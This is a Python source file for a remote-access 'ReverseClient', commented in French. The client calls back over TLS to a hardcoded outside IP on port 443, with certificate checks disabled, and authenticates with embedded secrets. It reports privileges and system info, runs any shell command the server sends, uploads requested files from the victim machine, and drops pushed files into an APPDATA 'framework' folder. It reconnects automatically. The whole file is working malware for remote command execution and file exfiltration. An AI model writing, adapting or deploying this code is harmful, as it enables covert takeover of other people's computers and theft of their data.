import socket
import subprocess
import json
import struct
import ssl
import hmac
import hashlib
import os
from collections import OrderedDict
import itertools
import sys
import platform
import time
import threading
import ctypes
import re

class ReverseClient:
    def __init__(self, server_ip, server_port, password=None):
        self.server_ip = server_ip
        self.server_port = server_port
        self.password = password
        self.running = True
        self.crypto_secret = "h7Xq#9Pm$2Rv!5Ys@8Tn%4Wz*1Za&3Cd(6Fg)0Jk"
        self.current_file_info = None
        self.is_admin = False
        
        # Detecter les privileges administrateur au demarrage
        self.detect_admin_privileges()
    
    def detect_admin_privileges(self):
        # Detecte si le client a des privileges administrateur sur Windows
        try:
            if platform.system() == "Windows":
                # Verifier si l'utilisateur a les privileges administrateur
                self.is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                print(f"[+] Privileges: {'ADMIN' if self.is_admin else 'USER'}")
            else:
                # Pour les systemes non-Windows, marquer comme USER par defaut
                self.is_admin = False
                print(f"[+] Systeme {platform.system()} - privileges: USER")
                
        except Exception as e:
            print(f"[-] Erreur detection privileges: {e}")
            self.is_admin = False
    
    def expand_path(self, path):
        # Etend les variables d'environnement dans un chemin
        try:
            if platform.system() == "Windows":
                # Remplacer $env:VAR par %VAR%
                def replace_var(match):
                    var = match.group(1)
                    return os.environ.get(var, match.group(0))
                
                # Gere $env:APPDATA
                expanded = re.sub(r'\$env:([A-Za-z_][A-Za-z0-9_]*)', replace_var, path)
                # Gere %APPDATA%
                expanded = os.path.expandvars(expanded)
                return expanded
            else:
                return os.path.expandvars(path)
        except Exception as e:
            print(f"[-] Erreur expansion chemin: {e}")
            return path
    
    def calculate_md5(self, filepath):
        # Calcule le MD5 d'un fichier
        hash_md5 = hashlib.md5()
        with open(filepath, "rb") as f:
            for chunk in iter(lambda: f.read(65536), b""):
                hash_md5.update(chunk)
        return hash_md5.hexdigest()
    
    def send_file_binary(self, ssl_sock, filepath):
        # Envoie un fichier en utilisant un protocole fiable avec prefixe de taille
        try:
            # Expander le chemin avant de verifier
            original_path = filepath
            filepath = self.expand_path(filepath)
            print(f"[+] Chemin original: {original_path}")
            print(f"[+] Chemin expanse: {filepath}")
            print(f"[+] Repertoire courant: {os.getcwd()}")
            
            if not os.path.exists(filepath):
                print(f"[-] Fichier introuvable: {filepath}")
                # Verifier si le dossier parent existe
                parent_dir = os.path.dirname(filepath)
                if os.path.exists(parent_dir):
                    print(f"[+] Le dossier parent existe: {parent_dir}")
                    # Lister les fichiers dans le dossier
                    try:
                        files = os.listdir(parent_dir)
                        print(f"[+] Fichiers dans {parent_dir}:")
                        for f in files[:10]:  # Affiche les 10 premiers
                            print(f"  - {f}")
                    except Exception as e:
                        print(f"[+] Impossible de lister le dossier: {e}")
                else:
                    print(f"[+] Le dossier parent n'existe pas: {parent_dir}")
                
                self.send_json(ssl_sock, {
                    "type": "file_error",
                    "data": f"Fichier introuvable: {filepath}"
                })
                return False
            
            filename = os.path.basename(filepath)
            filesize = os.path.getsize(filepath)
            file_md5 = self.calculate_md5(filepath)
            
            # 1. Envoyer un message JSON pour annoncer le transfert
            self.send_json(ssl_sock, {
                "type": "file_transfer_start",
                "data": {
                    "filename": filename,
                    "size": filesize,
                    "md5": file_md5
                }
            })
            
            # Attendre un peu que le serveur soit pret
            time.sleep(0.5)
            
            # 2. Envoyer la taille du fichier (8 bytes, big-endian)
            ssl_sock.send(struct.pack('!Q', filesize))
            
            # 3. Envoyer le fichier en binaire
            print(f"[+] Envoi du fichier: {filename} ({filesize} octets)")
            print(f"[*] Envoi en cours...")
            
            taille_totale = 0
            debut = time.time()
            
            with open(filepath, "rb") as f:
                while True:
                    data = f.read(65536)  # 64KB chunks
                    if not data:
                        break
                    ssl_sock.send(data)
                    taille_totale += len(data)
                    
                    # Afficher la progression
                    if taille_totale > 0:
                        print(f"\r[*] Envoye : {taille_totale / 1024:.2f} KB", end='')
            
            duree = time.time() - debut
            print()  # Nouvelle ligne
            
            print(f"[+] Fichier envoye avec succes !")
            print(f"    - Taille : {taille_totale / 1024:.2f} KB ({taille_totale} octets)")
            print(f"    - Duree : {duree:.2f} secondes")
            print(f"    - MD5: {file_md5}")
            
            # 4. Attendre l'accuse de reception du serveur
            ack = self.receive_json(ssl_sock)
            if ack and ack.get("type") == "file_ack":
                if ack.get("data", {}).get("status") == "ok":
                    print(f"[+] Serveur a confirme la reception")
                else:
                    print(f"[-] Serveur a signale une erreur: {ack.get('data', {}).get('message')}")
            else:
                print(f"[-] Pas d'accuse de reception du serveur")
            
            return True
            
        except Exception as e:
            print(f"[-] Erreur lors de l'envoi du fichier: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def handle_file_transfer(self, ssl_sock):
        # Gere la reception d'un fichier binaire du serveur avec protocole fiable
        try:
            if not self.current_file_info:
                print("[-] Erreur: informations fichier manquantes")
                return False
            
            filename = self.current_file_info.get("filename", "received_file")
            file_size = self.current_file_info.get("size", 0)
            expected_md5 = self.current_file_info.get("md5", "")
            
            # Creer le dossier framework dans APPDATA
            appdata = os.environ.get('APPDATA', os.path.expanduser('~'))
            framework_dir = os.path.join(appdata, 'framework')
            
            # Creer le dossier s'il n'existe pas
            if not os.path.exists(framework_dir):
                os.makedirs(framework_dir)
                print(f"[+] Dossier cree: {framework_dir}")
            
            # Chemin complet de sauvegarde
            save_path = os.path.join(framework_dir, filename)
            
            print(f"[+] Reception du fichier {filename} ({file_size} bytes)...")
            print(f"[+] Sauvegarde dans: {save_path}")
            print(f"[*] Reception en cours...")
            
            # Lire la taille du fichier (8 bytes, big-endian)
            size_data = ssl_sock.recv(8)
            if len(size_data) != 8:
                print("[-] Erreur: impossible de lire la taille du fichier")
                return False
            
            actual_size = struct.unpack('!Q', size_data)[0]
            print(f"[*] Taille recue: {actual_size} bytes")
            
            if actual_size != file_size:
                print(f"[-] ERREUR: Taille incoherente! Attendu: {file_size}, Recu: {actual_size}")
                return False
            
            # Ouvrir le fichier en ecriture binaire
            taille_totale = 0
            debut = time.time()
            
            with open(save_path, 'wb') as f:
                while taille_totale < actual_size:
                    # Recevoir par morceaux de 64KB
                    reste = actual_size - taille_totale
                    chunk_size = min(65536, reste)
                    data = ssl_sock.recv(chunk_size)
                    if not data:
                        break
                    f.write(data)
                    taille_totale += len(data)
                    
                    # Afficher la progression
                    if taille_totale > 0:
                        progress = (taille_totale / actual_size) * 100
                        print(f"\r[*] Progression: {taille_totale}/{actual_size} bytes ({progress:.1f}%)", end='')
            
            duree = time.time() - debut
            print()  # Nouvelle ligne
            
            # Verifier l'integrite du fichier
            if expected_md5:
                actual_md5 = hashlib.md5()
                with open(save_path, "rb") as f:
                    for chunk in iter(lambda: f.read(65536), b""):
                        actual_md5.update(chunk)
                actual_md5 = actual_md5.hexdigest()
                
                if actual_md5 != expected_md5:
                    print(f"[-] ERREUR: MD5 mismatch! Attendu: {expected_md5}, Recu: {actual_md5}")
                    os.remove(save_path)
                    self.current_file_info = None
                    return False
                else:
                    print(f"[+] MD5 verifie: {actual_md5}")
            
            print(f"[+] Fichier sauvegarde: {save_path} ({taille_totale} bytes)")
            print(f"    - Duree : {duree:.2f} secondes")
            
            # Reinitialiser les informations fichier
            self.current_file_info = None
            
            # Confirmer la reception
            self.send_json(ssl_sock, {
                "type": "file_received", 
                "data": f"Fichier {filename} recu dans {save_path}"
            })
            
            return taille_totale > 0
            
        except Exception as e:
            print(f"[-] Erreur lors de la reception du fichier: {e}")
            import traceback
            traceback.print_exc()
            self.current_file_info = None
            return False
    
    def handle_crypto_challenge(self, client_socket):
        # Gere le challenge cryptographique
        try:
            # Recevoir le challenge (premier message du serveur)
            data = client_socket.recv(1024).decode().strip()
            if not data.startswith("CRYPTO_CHALLENGE:"):
                return False
            
            challenge = data.split(":", 1)[1].strip()
            
            # Calculer la reponse HMAC
            response = hmac.new(
                self.crypto_secret.encode(),
                challenge.encode(),
                hashlib.sha256
            ).hexdigest()
            
            # Envoyer la reponse
            client_socket.send(response.encode())
            return True
        except:
            return False
    
    def send_json(self, socket, data):
        # Envoie un message JSON avec taille
        try:
            json_data = json.dumps(data).encode()
            socket.send(struct.pack('!I', len(json_data)))
            socket.send(json_data)
            return True
        except:
            return False
    
    def receive_json(self, socket):
        # Recoit un message JSON avec taille
        try:
            size_data = socket.recv(4)
            if not size_data:
                return None
            msg_size = struct.unpack('!I', size_data)[0]
            
            received = b""
            while len(received) < msg_size:
                chunk = socket.recv(4096)
                if not chunk:
                    return None
                received += chunk
                
            return json.loads(received.decode())
        except:
            return None
    
    def execute_command(self, cmd):
        # Execute une commande shell et retourne le resultat
        try:
            result = subprocess.run(cmd, shell=True,
                                  capture_output=True,
                                  text=True)
            
            # Combiner stdout et stderr
            output = result.stdout
            if result.stderr:
                if output:
                    output += "\n" + result.stderr
                else:
                    output = result.stderr
            
            # Si la sortie est vide mais que la commande a reussi
            if not output and result.returncode == 0:
                return "[Commande executee avec succes (aucune sortie)]"
            
            return output if output is not None else ""
            
        except Exception as e:
            return f"Erreur: {str(e)}"
    
    def get_system_info(self):
        # Informations systeme basiques avec privileges
        info = {
            "system": platform.system(),
            "hostname": socket.gethostname(),
            "user": os.getenv("USERNAME") or os.getenv("USER"),
            "cwd": os.getcwd(),
            "privileges": "ADMIN" if self.is_admin else "USER"
        }
        return json.dumps(info)
    
    def start_heartbeat(self, ssl_sock):
        # Thread pour envoyer des heartbeats reguliers
        def heartbeat_loop():
            while self.running:
                try:
                    time.sleep(25)
                    self.send_json(ssl_sock, {"type": "heartbeat", "data": "alive"})
                except:
                    break
        
        thread = threading.Thread(target=heartbeat_loop)
        thread.daemon = True
        thread.start()
        return thread
    
    def connect_and_serve(self):
        # Connexion principale et boucle de service
        while self.running:
            try:
                # Creer socket et SSL
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                
                # Connexion SSL
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                ssl_sock = context.wrap_socket(sock, server_hostname=self.server_ip)
                ssl_sock.connect((self.server_ip, self.server_port))
                
                print(f"[+] Connecte a {self.server_ip}:{self.server_port}")
                
                # 1. Challenge crypto
                if not self.handle_crypto_challenge(ssl_sock):
                    print("[-] Challenge crypto echoue")
                    ssl_sock.close()
                    continue
                
                # 2. Envoyer User-Agent
                ssl_sock.send(b"X-Client-Version: 1.0.4\r\n")
                
                # 3. Authentification
                if self.password:
                    self.send_json(ssl_sock, {"password": self.password})
                    auth_response = self.receive_json(ssl_sock)
                    if not auth_response or auth_response.get("status") != "authenticated":
                        print("[-] Authentification echouee")
                        ssl_sock.close()
                        continue
                
                print("[+] Authentifie avec succes")
                
                # 4. Envoyer immediatement les informations de privileges
                self.send_json(ssl_sock, {
                    "type": "privileges_info", 
                    "data": {
                        "privileges": "ADMIN" if self.is_admin else "USER"
                    }
                })
                
                # 5. Demarrer le heartbeat
                self.start_heartbeat(ssl_sock)
                
                # 6. Envoyer un message READY immediatement
                self.send_json(ssl_sock, {"type": "ready", "data": "Client connected and waiting"})
                
                # 7. Boucle de commandes
                while True:
                    try:
                        # Configurer un timeout pour eviter le blocage infini
                        ssl_sock.settimeout(30.0)
                        command = self.receive_json(ssl_sock)
                        ssl_sock.settimeout(None)
                        
                        if not command:
                            print("[-] Connexion fermee par le serveur")
                            break
                        
                        cmd_type = command.get("type", "")
                        cmd_data = command.get("data", "")
                        
                        # Gestion des differents types de commandes
                        if cmd_type == "cmd":
                            output = self.execute_command(cmd_data)
                            if output is None:
                                output = ""
                            self.send_json(ssl_sock, {"type": "cmd_result", "data": output})
                        
                        elif cmd_type == "download":
                            # Telecharger un fichier du client vers le serveur
                            filepath = cmd_data
                            print(f"[+] Demande de telechargement: {filepath}")
                            self.send_file_binary(ssl_sock, filepath)
                        
                        elif cmd_type == "sysinfo":
                            info = self.get_system_info()
                            self.send_json(ssl_sock, {"type": "sysinfo_result", "data": info})
                        
                        elif cmd_type == "file_start":
                            # Debut d'un transfert de fichier (serveur -> client)
                            print("[+] Debut de transfert de fichier depuis le serveur...")
                            self.current_file_info = cmd_data
                            # Confirmer que le client est pret a recevoir
                            self.send_json(ssl_sock, {"type": "file_ready", "data": "Pret a recevoir"})
                            # Lancer la reception du fichier
                            self.handle_file_transfer(ssl_sock)
                        
                        elif cmd_type == "file_end":
                            # Fin du transfert (gere dans handle_file_transfer)
                            pass
                        
                        elif cmd_type == "ping":
                            # Repondre aux pings du serveur
                            self.send_json(ssl_sock, {"type": "pong", "data": "alive"})
                        
                        elif cmd_type == "heartbeat_ack":
                            # Reponse du serveur a nos heartbeats - ignorer silencieusement
                            continue
                        
                        elif cmd_type == "exit":
                            print("[+] Commande exit recue")
                            self.running = False
                            break
                            
                        else:
                            # Commandes inconnues
                            self.send_json(ssl_sock, {"type": "error", "data": f"Commande inconnue: {cmd_type}"})
                            
                    except socket.timeout:
                        # Timeout normal, continuer la boucle
                        continue
                    except (ConnectionResetError, socket.error, BrokenPipeError):
                        print("[-] Connexion perdue avec le serveur")
                        break
                    except Exception as e:
                        print(f"[-] Erreur: {e}")
                        self.send_json(ssl_sock, {"type": "error", "data": str(e)})
                        break
                
                ssl_sock.close()
                
            except (ConnectionRefusedError, socket.timeout):
                print("[-] Impossible de se connecter, reessai dans 10s...")
                time.sleep(10)
            except Exception as e:
                print(f"[-] Erreur de connexion: {e}")
                time.sleep(10)

if __name__ == "__main__":
    SERVER_IP = "89.147.109.44"
    SERVER_PORT = 443
    PASSWORD = "K8#vQ$2pL9!xY3@mN6&zR1*wT5%sD4^fG7"
    
    client = ReverseClient(SERVER_IP, SERVER_PORT, PASSWORD)
    client.connect_and_serve()